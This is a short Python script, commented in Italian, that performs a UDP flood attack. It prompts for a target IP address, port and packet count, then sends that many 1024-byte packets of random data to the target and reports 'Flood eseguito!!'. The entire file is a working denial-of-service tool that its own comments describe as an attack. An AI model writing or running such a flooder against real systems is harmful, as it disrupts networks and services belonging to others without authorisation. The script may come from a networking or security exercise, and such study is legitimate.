#Importazione moduli
import socket
import random

#istanzio l'oggetto di tipo socket e lo configuro per poter interfacciarsi
#tramite IPv4 e protocollo di trasferimento UDP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#Accetto in input dall'utente tutti i parametri necessari ad impostare l'attacco
ip_target = input("Inserisci l'indirizzo IP target:  ")
porta_target = int (input("Inserisci la porta target"))
n_packet = int (input("Quanti pacchetti vuoi inviare?"))

#genero il contenuto del pacchetto invocando il metodo random
packet = random.randbytes(1024)

#tramite un ciclo for gestisco il numero di pacchetti da inviare
for x in range(n_packet):
    s.sendto(packet, (ip_target, porta_target))

#informo l'utente della fine dell'esecuzione del programma
print("Flood eseguito!!")
